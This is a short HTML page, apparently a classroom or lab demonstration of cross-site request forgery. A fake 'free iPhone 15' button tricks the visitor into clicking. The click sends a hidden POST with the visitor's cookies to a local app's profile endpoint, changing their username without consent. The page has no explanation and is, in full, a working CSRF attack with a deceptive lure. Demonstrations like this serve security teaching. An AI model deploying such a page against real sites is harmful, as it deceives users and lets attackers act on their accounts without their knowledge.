<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Cross Site Request Forgery</title>
  </head>
  <body>
    <h1>Click below to get a free iPhone 15!</h1>
    <button id="not-malicious">
      Click me! Win an iPhone 15! No strings attached!
    </button>
    <script>
      (function () {
        window.onload = function () {
          document
            .querySelector("#not-malicious")
            .addEventListener("click", function () {
              fetch("http://localhost:8084/profile", {
                method: "POST",
                mode: "no-cors",
                body: "username=fool",
                credentials: "include",
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded",
                },
              }).then((res) => {
                alert("Please ask Paco for your newest iPhone 15");
              });
            });
        };
      })();
    </script>
  </body>
</html>
